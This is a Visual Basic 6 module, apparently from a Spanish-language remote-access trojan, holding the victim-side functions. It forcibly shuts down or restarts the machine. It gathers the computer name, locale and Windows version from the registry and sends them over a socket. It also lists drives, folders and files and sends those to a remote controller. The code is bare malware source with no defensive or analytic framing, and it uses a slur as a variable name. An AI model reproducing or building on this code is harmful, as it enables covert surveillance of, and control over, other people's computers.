Attribute VB_Name = "Funciones"
Dim B As String, O() As Byte, B2 As String, MARICA As String
Dim i As Long
Dim x As String
Const LOCALE_SNATIVECTRYNAME = &H8
Const LOCALE_USER_DEFAULT = &H400
Private Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" _
                         (ByVal Locale As Long, ByVal LCType As Long, ByVal _
                          lpLCData As String, ByVal cchData As Long) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Public Sub APAGARPC()

Shell "shutdown -s -f -t 00", vbMinimizedFocus

End Sub

Public Sub EnviarDatos()
Dim x As Object
Set x = CreateObject("wscript.shell")
MARICA = "DATILLOS" & "#" & Environ("COMPUTERNAME") & "#" & ObtenerIdioma(LOCALE_SNATIVECTRYNAME) & "#" & x.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Productname")
CASITA1.SM.SendData MARICA
DoEvents
MARICA = ""
End Sub
Public Function ObtenerIdioma(ByVal lInfo As Long) As String
Dim buffer As String, ret As String
buffer = String$(256, 0)
ret = GetLocaleInfo(LOCALE_USER_DEFAULT, lInfo, buffer, Len(buffer))
If ret > 0 Then
ObtenerIdioma = Left$(buffer, ret - 1)
Else
ObtenerIdioma = ""
End If
End Function





Public Sub REINICIARPC()

Shell "shutdown -r -f -t 00", vbMinimizedFocus

End Sub

Public Sub ABRIRWEB()

x = ShellExecute(CASITA1.hwnd, "Open", CASITA1.WEB, &O0, &O0, SW_NORMAL)

End Sub

Public Sub MANDARDRIVES()

For i = 0 To CASITA1.Drive1.ListCount - 1
    B = B & CASITA1.Drive1.List(i) & "#"
Next

B = CASITA1.Drive1.ListCount & "#" & B
B = "DISCOS" & "#" & B
CASITA1.SM.SendData B
B = ""


End Sub

Public Sub MANDARDIR()



For i = 0 To CASITA1.Dir1.ListCount - 1
    B = B & CASITA1.Dir1.List(i) & "#"
Next

B = CASITA1.Dir1.ListCount & "#" & B
B = "DIR" & "#" & B

CASITA1.SM.SendData B
B = ""


End Sub

Public Sub MANDARARCHIVOS()

For i = 0 To CASITA1.File1.ListCount
    B = B & CASITA1.File1.List(i) & "#"
Next

B = CASITA1.File1.ListCount & "#" & B
B = "ARCHIS" & "#" & B

CASITA1.SM.SendData B
B = ""


End Sub
